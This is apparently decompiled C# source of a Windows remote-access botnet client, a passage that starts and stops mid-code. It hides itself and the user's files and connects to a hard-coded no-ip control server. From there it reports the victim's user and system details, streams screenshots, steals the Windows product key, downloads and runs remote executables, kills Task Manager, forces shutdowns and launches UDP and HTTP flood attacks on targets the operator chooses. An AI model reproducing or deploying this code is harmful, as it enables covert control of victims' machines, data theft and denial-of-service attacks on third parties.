		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual BackgroundWorker vmethod_54()
	{
		return backgroundWorker_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_55(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = method_10;
		if (backgroundWorker_1 != null)
		{
			backgroundWorker_1.DoWork -= value;
		}
		backgroundWorker_1 = backgroundWorker_4;
		if (backgroundWorker_1 != null)
		{
			backgroundWorker_1.DoWork += value;
		}
	}

	[DebuggerNonUserCode]
	internal virtual BackgroundWorker vmethod_56()
	{
		return backgroundWorker_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_57(BackgroundWorker backgroundWorker_4)
	{
		DoWorkEventHandler value = method_11;
		if (backgroundWorker_2 != null)
		{
			backgroundWorker_2.DoWork -= value;
		}
		backgroundWorker_2 = backgroundWorker_4;
		if (backgroundWorker_2 != null)
		{
			backgroundWorker_2.DoWork += value;
		}
	}

	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_58()
	{
		return pictureBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_59(PictureBox pictureBox_4)
	{
		pictureBox_2 = pictureBox_4;
	}

	[DebuggerNonUserCode]
	internal virtual TextBox vmethod_60()
	{
		return textBox_19;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_61(TextBox textBox_20)
	{
		textBox_19 = textBox_20;
	}

	[DebuggerNonUserCode]
	internal virtual Timer vmethod_62()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_63(Timer timer_2)
	{
		EventHandler eventHandler = method_12;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[DebuggerNonUserCode]
	internal virtual PictureBox vmethod_64()
	{
		return pictureBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_65(PictureBox pictureBox_4)
	{
		pictureBox_3 = pictureBox_4;
	}

	public string GetProductKey(string KeyPath, string ValueName)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)Class1.smethod_0()).get_Registry().GetValue(KeyPath, ValueName, (object)0));
		if (objectValue == null)
		{
			return "N/A";
		}
		string text = string.Empty;
		int num = Information.LBound((Array)objectValue, 1);
		int num2 = Information.UBound((Array)objectValue, 1);
		checked
		{
			for (int i = num; i <= num2; i++)
			{
				text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
			}
			int num3 = 52;
			string[] array = new string[25]
			{
				"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
				"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
				"6", "7", "8", "9", null
			};
			int num4 = 29;
			int num5 = 15;
			string[] array2 = new string[16];
			string[] array3 = new string[31];
			string text2 = string.Empty;
			int num6 = 67;
			for (int j = 52; j <= num6; j++)
			{
				array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
				text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
			}
			string text3 = string.Empty;
			for (int k = num4 - 1; k >= 0; k += -1)
			{
				int num7;
				unchecked
				{
					if (checked(k + 1) % 6 == 0)
					{
						array3[k] = "-";
						text3 += "-";
						continue;
					}
					num7 = 0;
				}
				for (int l = num5 - 1; l >= 0; l += -1)
				{
					int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
					unchecked
					{
						array2[l] = Conversions.ToString(num8 / 24);
						num7 = num8 % 24;
					}
				}
				array3[k] = array[num7];
				text3 += array[num7];
			}
			return Strings.StrReverse(text3);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr FindWindow(string string_9, string string_10);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_10);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int Beep(int dwFreq, int dwDuration);

	[DllImport("kernel32.dll", EntryPoint = "Beep")]
	public static extern int Beep_1(int dwFreq, int dwDuration);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetAsyncKeyState(long vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetActiveWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetWindowTextA(long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, long long_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_10);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA_1(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, int int_10);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(long long_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte byte_0, byte byte_1, int int_10, int int_11);

	[DllImport("kernel32", CharSet = CharSet.Unicode, EntryPoint = "Beep", ExactSpelling = true, SetLastError = true)]
	public static extern int Beep_2(int dwFreq, int dwDuration);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "Beep", ExactSpelling = true, SetLastError = true)]
	public static extern int Beep_3(int dwFreq, int dwDuration);

	[DllImport("kernel32", CharSet = CharSet.Auto, EntryPoint = "Beep", SetLastError = true)]
	public static extern int Beep_4(int dwFreq, int dwDuration);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
	public static extern int BeepW(int dwFreq, int dwDuration);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriverIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int int_10, int int_11, int nWidth, short nHeight, int hWnd, int nID);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int Msg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int int_10, int int_11, int cx, int cy, int wFlags);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool DestroyWindow(int hndw);

	[DebuggerNonUserCode]
	internal virtual BackgroundWorker vmethod_66()
	{
		return backgroundWorker_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[DebuggerNonUserCode]
	internal virtual void vmethod_67(BackgroundWorker backgroundWorker_4)
	{
		backgroundWorker_3 = backgroundWorker_4;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExitProcess(uint uExitCode);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_10, int int_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, int int_12);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_10);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowExA(int int_10, int int_11, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_10);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool EnableWindow(int int_10, int int_11);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetMenu(int int_10);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetSubMenu(int int_10, int int_11);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetMenuItemID(int int_10, int int_11);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnableMenuItem(int int_10, int int_11, int int_12);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SendMessageA", ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA_1(int int_10, int int_11, int int_12, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LockWindowUpdate(int int_10);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ShowCursor(bool bShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessage", SetLastError = true)]
	private static extern void SendMessage_1(int int_10, uint uint_0, uint uint_1, int int_11);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_10, long long_0, long long_1);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHEmptyRecycleBinA(int int_10, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_9, int int_11);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHUpdateRecycleBinIcon();

	private void method_0()
	{
		int int_ = ((Control)this).get_Handle().ToInt32();
		string string_ = null;
		SHEmptyRecycleBinA(int_, ref string_, 5);
		SHUpdateRecycleBinIcon();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Hide();
			Hide();
			((Control)this).set_Visible(false);
			((Form)this).set_ShowIcon(false);
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_Opacity(0.0);
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			Class8 @class = new Class8("Th3r31ncefaebf9bfdsjasdjasp4dapecul1arfeelinsHELAIDOnHeRB4ckOpen3dhercr4kandpi$$3dalloverdaceilinghf32hqfnwabwev283e19");
			if (@class.method_0())
			{
				Environment.Exit(0);
			}
			Class5.smethod_0();
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			Class11.smethod_2(bool_0: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		registryKey_0 = Registry.LocalMachine;
		registryKey_1 = registryKey_0.OpenSubKey("HARDWARE");
		registryKey_2 = registryKey_1.OpenSubKey("DESCRIPTION");
		registryKey_3 = registryKey_2.OpenSubKey("SYSTEM");
		registryKey_4 = registryKey_3.OpenSubKey("CentralProcessor");
		registryKey_5 = registryKey_4.OpenSubKey("0");
		string_0 = registryKey_5.GetValue("ProcessorNameString")!.ToString() + " ~ " + registryKey_5.GetValue("~Mhz")!.ToString() + "MHz";
		try
		{
			isdisconnected = 0;
			vmethod_52().set_Enabled(true);
			Hide();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void Connect()
	{
		try
		{
			tcpClient_0 = new TcpClient("s2m.no-ip.info", Conversions.ToInteger("15382"));
			Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"CONNECTED|", GClass1.smethod_1()), (object)"|3.1|Idle...|"), (object)DetectOS()), (object)"|"), (object)Environment.UserDomainName), (object)"/"), (object)Environment.UserName), (object)"|"), (object)string_0)));
			tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
			isdisconnected = 1;
			thread_1 = new Thread(method_1);
			thread_1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isdisconnected = 0;
			ProjectData.ClearProjectError();
		}
	}

	public void sendx2()
	{
	}

	private void method_1()
	{
		try
		{
			tcpClient_1 = new TcpClient("s2m.no-ip.info", int.Parse("3175"));
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			using NetworkStream serializationStream = tcpClient_1.GetStream();
			binaryFormatter.Serialize(serializationStream, CaptureDesktop());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void desktop(Image image, ImageFormat format)
	{
	}

	public void stufftdo()
	{
	}

	public void Read(IAsyncResult ar)
	{
		try
		{
			StreamReader streamReader = new StreamReader(tcpClient_0.GetStream());
			string message = streamReader.ReadLine();
			Parse(message);
			tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			isdisconnected = 0;
			ProjectData.ClearProjectError();
		}
	}

	public Image CaptureDesktop()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Rectangle rectangle = default(Rectangle);
		Bitmap val = null;
		Graphics val2 = null;
		rectangle = Screen.get_PrimaryScreen().get_Bounds();
		val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
		val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
		return (Image)(object)val;
	}

	public void Parse(string Message)
	{
		//IL_05fd: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] array = Message.Split(new char[1] { '|' });
			switch (array[0])
			{
			case "DL":
				try
				{
					WebClient webClient = new WebClient();
					string fileName = Path.GetTempFileName() + ".exe";
					SendStatus("Downloading File...");
					webClient.DownloadFile(array[1], fileName);
					Process.Start(fileName);
					SendStatus("File Executed.");
					break;
				}
				catch (Exception projectError12)
				{
					ProjectData.SetProjectError(projectError12);
					SendStatus("File Failed to Download or Execute");
					ProjectData.ClearProjectError();
					break;
				}
			case "DIE":
				try
				{
					Connect();
					tcpClient_0.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, Read, null);
					break;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					SendStatus(ex2.Message);
					ProjectData.ClearProjectError();
					break;
				}
			case "EHF":
				show();
				break;
			case "DHF":
				Hide();
				break;
			case "MONITOR":
				if (Operators.CompareString(array[1], "ON", false) == 0)
				{
					SendMessageA(-1, 274, 61808, GEnum1.PowerOn);
					SendStatus("Monitor on");
				}
				if (Operators.CompareString(array[1], "OFF", false) == 0)
				{
					SendMessageA(-1, 274, 61808, GEnum1.PowerOff);
					SendStatus("Monitor off");
				}
				break;
			case "          UDP":
				try
				{
					SendStatus("UDP Flood Active");
					derp = 1;
					IPxxx = array[1];
					Portxxx = Conversions.ToInteger(array[2]);
					if (Operators.CompareString(array[3], "            Fucking Rapid", false) == 0)
					{
						Timexxx = 4;
					}
					if (Operators.CompareString(array[3], "            Fast", false) == 0)
					{
						Timexxx = 9;
					}
					if (Operators.CompareString(array[3], "            Medium", false) == 0)
					{
						Timexxx = 15;
					}
					if (Operators.CompareString(array[3], "            Slow", false) == 0)
					{
						Timexxx = 25;
					}
					if (Operators.CompareString(array[3], "            Snail", false) == 0)
					{
						Timexxx = 55;
					}
					try
					{
						vmethod_44().RunWorkerAsync();
						vmethod_54().RunWorkerAsync();
						vmethod_56().RunWorkerAsync();
						break;
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
						break;
					}
				}
				catch (Exception projectError11)
				{
					ProjectData.SetProjectError(projectError11);
					derp = 0;
					Class6.smethod_0();
					SendStatus("Floods Failed");
					ProjectData.ClearProjectError();
					break;
				}
			case "          HTTP":
				try
				{
					if (Class6.bool_0)
					{
						Class6.smethod_0();
					}
					Class6.string_0 = array[1];
					Class6.int_1 = 45;
					Class6.int_0 = Conversions.ToInteger("60");
					Thread.Sleep(500);
					Class6.smethod_1();
					SendStatus("HTTP Flood Active");
					break;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					derp = 0;
					Class6.smethod_0();
					SendStatus("HTTP Error");
					ProjectData.ClearProjectError();
					break;
				}
			case "viewdesktop":
				method_1();
				break;
			case "stopdesktop":
				break;
			case "STOPFLOOD":
				try
				{
					derp = 0;
					Class6.smethod_0();
					SendStatus("Floods Stopped");
					break;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					derp = 0;
					Class6.smethod_0();
					SendStatus("Floodstop Failed");
					ProjectData.ClearProjectError();
					break;
				}
			case "TASKBAR":
				if (Operators.CompareString(array[1], "SHOW", false) == 0)
				{
					IntPtr intptr_ = FindWindow("Shell_TrayWnd", null);
					ShowWindow(intptr_, 4);
					SendStatus("Tbar Shown");
				}
				if (Operators.CompareString(array[1], "HIDE", false) == 0)
				{
					IntPtr intptr_2 = FindWindow("Shell_TrayWnd", null);
					ShowWindow(intptr_2, 0);
					SendStatus("Tbar Hidden");
				}
				break;
			case "CD":
				if (Operators.CompareString(array[1], "OPEN", false) == 0)
				{
					string string_ = "Set CDAudio Door Open Wait";
					string string_2 = Conversions.ToString(0L);
					mciSendStringA(ref string_, ref string_2, 0L, 0L);
					SendStatus("Opened CD Tray");
				}
				if (Operators.CompareString(array[1], "CLOSE", false) == 0)
				{
					string string_2 = "Set CDAudio Door Closed Wait";
					string string_ = Conversions.ToString(0L);
					mciSendStringA(ref string_2, ref string_, 0L, 0L);
					SendStatus("Closed CD Tray");
				}
				break;
			case "uninstall":
				try
				{
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.DeleteValue("Update");
					registryKey.Close();
					Application.Exit();
					ProjectData.EndApp();
					ProjectData.EndApp();
					break;
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
					break;
				}
			case "SHUTDOWN":
				Process.Start("shutdown", "-s -t 00");
				break;
			case "RESTART":
				Process.Start("shutdown", "-r -t 00");
				break;
			case "EMPTYBIN":
				try
				{
					SendStatus("Emptying Bin");
					method_0();
					SendStatus("Bin Empty");
					break;
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					SendStatus("Bin Empty Failed");
					ProjectData.ClearProjectError();
					break;
				}
			case "MSG":
				try
				{
					SendStatus("Message Sent");
					Interaction.MsgBox((object)array[1], (MsgBoxStyle)0, (object)array[2]);
					SendStatus("Message Recieved");
					break;
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					SendStatus("Failed Message");
					ProjectData.ClearProjectError();
					break;
				}
			case "REFRESH":
				try
				{
					derp = 0;
					Class6.smethod_0();
					Send("DISCONNECT");
					tcpClient_0.Close();
					SendStatus("Bots Refreshed");
					break;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					SendStatus("Bots failed to refresh");
					ProjectData.ClearProjectError();
					break;
				}
			case "WINKEY":
				SendStatus("Getting Windows Key...");
				try
				{
					WINKEY();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					SendStatus("Failed Getting Windows Key.");
					ProjectData.ClearProjectError();
				}
				SendStatus("Achieved Windows Key.");
				break;
			case "SITE":
				try
				{
					SendStatus("Opening Website...");
					Process.Start(array[1]);
					SendStatus("Website Opened");
					break;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					SendStatus("Open Website Failed");
					ProjectData.ClearProjectError();
					break;
				}
			case "SPEAK":
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", string.Empty));
				object[] array2 = new object[1];
				int num = 1;
				array2[0] = array[1];
				object[] array3 = array2;
				bool[] array4 = new bool[1] { true };
				NewLateBinding.LateCall(objectValue, (Type)null, "speak", array3, (string[])null, (Type[])null, array4, true);
				if (array4[0])
				{
					array[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
				}
				SendStatus("T2SM Sent!");
				break;
			}
			case "CHANGEBACKGROUND":
				try
				{
					SendStatus("Downloading Wallpaper...");
					method_3(array[1]);
					SendStatus("Wallpaper Changed");
					break;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					SendStatus("Error Changing Wallpaper...");
					ProjectData.ClearProjectError();
					break;
				}
			case "BEEP":
				Beep(1000, 1000);
				SendStatus("Console Beeped!");
				break;
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string message)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			streamWriter.WriteLine(message);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SendStatus(string Message)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(tcpClient_0.GetStream());
			streamWriter.WriteLine("STATUS|" + Message);
			streamWriter.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void KeepOpen()
	{
		Console.ReadLine();
	}

	public string DetectOS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string text = "Unknown OS - ";
		switch (oSVersion.Platform)
		{
		case PlatformID.Win32Windows:
			switch (oSVersion.Version.Minor)
			{
			case 0:
				text = "Windows 95 - ";
				break;
			case 10:
				text = "Windows 98 - ";
				break;
			case 90:
				text = "Windows ME - ";
				break;
			}
			break;
		case PlatformID.Win32NT:
			switch (oSVersion.Version.Major)
			{
			case 3:
				text = "Windows NT - ";
				break;
			case 4:
				text = "Windows NT - ";
				break;
			case 5:
				if (oSVersion.Version.Minor == 0)
				{
					text = "Windows 2K - ";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					text = "Windows XP - ";
				}
				else if (oSVersion.Version.Minor == 2)
				{
					text = "Windows 2K3 - ";
				}
				break;
			case 6:
				text = "Windows Vista - ";
				if (oSVersion.Version.Minor == 0)
				{
					text = "Windows Vista - ";
				}
				else if (oSVersion.Version.Minor == 1)
				{
					text = "Windows 7 - ";
				}
				break;
			}
			break;
		}
		OSVERSIONINFOEX osVersionInfo = default(OSVERSIONINFOEX);
		osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
		if (GetVersionEx(ref osVersionInfo))
		{
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 1"))
			{
				text += " SP1";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 2"))
			{
				text += " SP2";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 3"))
			{
				text += " SP3";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 4"))
			{
				text += " SP4";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 5"))
			{
				text += " SP5";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 6"))
			{
				text += " SP6";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 7"))
			{
				text += " SP7";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 8"))
			{
				text += " SP8";
			}
			if (osVersionInfo.szCSDVersion.ToString().Contains("Service Pack 9"))
			{
				text += " SP9";
			}
		}
		return text;
	}

	private string method_2(Version version_0)
	{
		return version_0.Major + "." + version_0.Minor + "." + version_0.Build;
	}

	[DllImport("kernel32.dll")]
	public static extern bool GetVersionEx(ref OSVERSIONINFOEX osVersionInfo);

	private object method_3(string string_9)
	{
		WebClient webClient = new WebClient();
		string text = string_9.Substring(checked(string_9.Length - 4));
		if (!File.Exists(Path.GetTempPath() + "wallpaper" + text))
		{
			webClient.DownloadFile(string_9, Path.GetTempPath() + "wallpaper" + text);
		}
		else
		{
			File.Delete(Path.GetTempPath() + "wallpaper" + text);
			webClient.DownloadFile(string_9, Path.GetTempPath() + "wallpaper" + text);
		}
		Image val = Image.FromFile(Path.GetTempPath() + "wallpaper" + text);
		val.Save(Path.GetTempPath() + "\\wallpaper.bmp", ImageFormat.get_Bmp());
		string string_10 = Path.GetTempPath() + "\\wallpaper.bmp";
		SystemParametersInfoA(20, 0, ref string_10, 1);
		return null;
	}

	private void method_4(string string_9)
	{
		throw new NotImplementedException();
	}

	public void WINKEY()
	{
		winkeyy = GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
		Send("WINDOWSKEY|" + winkeyy);
	}

	private void method_5(object sender, DoWorkEventArgs e)
	{
		while (true)
		{
			try
			{
				if (derp == 1)
				{
					UdpClient udpClient = new UdpClient();
					byte[] array = new byte[0];
					IPAddress addr = IPAddress.Parse(IPxxx);
					udpClient.Connect(addr, Portxxx);
					array = Encoding.ASCII.GetBytes("MeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEMeSsAgEDEJFAEWDNHADUEDESUDESUDSUDESU");
					udpClient.Send(array, array.Length);
					Thread.Sleep(Timexxx);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				derp = 0;
				Send("Floods Failed");
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Hide()
	{
		try
		{
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void show()
	{
		try
		{
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue(text, "Hidden", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_6(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object sender, EventArgs e)
	{
	}

	private void method_8(object sender, EventArgs e)
	{
	}

	private void method_9(object sender, EventArgs e)
	{
		if (isdisconnected == 0)
		{
			derp = 0;
			Class6.smethod_0();
			Thread.Sleep(4500);
			try
			{
				Connect();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				derp = 0;
				Class6.smethod_0();
				Connect();
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_10(object sender, DoWorkEventArgs e)
	{
		while (true)
		{
			try
			{
				if (derp == 1)
				{
					UdpClient udpClient = new UdpClient();
					byte[] array = new byte[0];
					IPAddress addr = IPAddress.Parse(IPxxx);
					udpClient.Connect(addr, Portxxx);
